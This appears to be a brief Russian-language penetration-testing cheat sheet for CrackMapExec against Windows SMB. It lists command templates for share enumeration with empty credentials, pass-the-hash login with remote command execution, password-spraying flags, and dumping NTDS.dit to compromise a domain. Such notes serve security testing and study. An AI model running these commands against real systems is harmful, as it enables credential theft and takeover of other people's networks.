Утилита, позволяющая выполнить проверку на доступность подключения к пользователям на windows машине.
## SMB
**Примеры:**
Прочитать доступные службы:
```
crackmapexec smb {IP} -u '' -p '' --shares
```
Аутентифицироваться по hash-у:
```
crackmapexec smb {IP} -u '' -H {HASH} -x {comand}
```
**Флаги:**
`-u` - username
`-p` - password
`-H` - password's hash
`-x` - исполнить команду
`--ntds` - дамп файла "**`ntds.dit`**". (А значит службы **NTDS**).

`-L` - посмотреть доступные модули
`-M {name}` - включить модуль
>вывод попадает в /tmp/{module name}/{IP}.json
>spider_plus - лист файлов и директорий

`--share {name}` - узнать конкретную службу, например DOCS
`--users` -  перечислить домены с юзерами

`--continue-on-success` - отвечает за то, чтобы процесс не прервался после нахождения валидной пары. Полезный флаг для **Password Spraying** атаки.
`--local-auth` - отвечает за прохождение аутентификации локально (не доменная учетная запись).
`--no-bruteforce` - отвечает за установление соответствия между пользователем и паролем, таким образом можно легко найти валидные учетные данные из большого списка, когда одному пользователю принадлежит только один определенный пароль.

---

### Дамб NTDS
Дамп NTDS.dit, тем самым полностью скомпрометировать домен:
```
crackmapexec smb {IP} -u {User} -p {pass} --ntds 
```